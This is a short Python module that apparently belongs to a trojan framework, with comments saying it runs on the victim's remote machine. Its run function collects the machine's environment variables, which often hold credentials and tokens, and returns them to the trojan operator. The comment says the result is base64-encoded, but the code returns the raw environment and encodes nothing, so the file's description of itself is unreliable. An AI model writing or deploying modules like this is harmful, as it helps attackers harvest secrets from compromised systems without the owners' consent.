#!/usr/bin/python3
#This module retrieves any environment variables that are set on the remote machine on which the trojan is executing
#and returns the base64-encoded string.

import os

def run(**args):
    print("[*] In environment module.")
    return os.environ